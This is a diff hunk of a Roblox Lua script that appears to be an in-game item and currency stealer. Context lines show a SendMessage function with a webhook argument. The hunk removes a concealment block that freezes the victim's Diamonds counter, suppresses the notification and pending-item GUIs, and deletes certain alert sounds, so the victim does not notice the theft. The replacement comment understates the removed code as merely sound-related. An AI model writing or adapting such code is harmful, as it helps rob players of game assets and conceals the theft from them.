@@ -241,46 +241,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
     )
 end
 
--- skidded that, SORRY!!
-
-local gemsleaderstat = Player.leaderstats["\240\159\146\142 Diamonds"].Value
-local gemsleaderstatpath = Player.leaderstats["\240\159\146\142 Diamonds"]
-gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(
-    function()
-        gemsleaderstatpath.Value = gemsleaderstat
-    end
-)
-
-local loading = Player.PlayerScripts.Scripts.Core["Process Pending GUI"]
-local noti = Player.PlayerGui.Notifications
-loading.Disabled = true
-noti:GetPropertyChangedSignal("Enabled"):Connect(
-    function()
-        noti.Enabled = false
-    end
-)
-noti.Enabled = false
-
-task.spawn(
-    function()
-        game.DescendantAdded:Connect(
-            function(x)
-                if x.ClassName == "Sound" then
-                    if
-                        x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or
-                            x.SoundId == "rbxassetid://12413423276"
-                     then
-                        x.Volume = 0
-                        x.PlayOnRemove = false
-                        x:Destroy()
-                    end
-                end
-            end
-        )
-    end
-)
-
--- no more skidding!
+-- Removed sound-related code
 
 local function GetThumbnail(imageid)
     Asset = string.split(imageid, "rbxassetid://")[2]
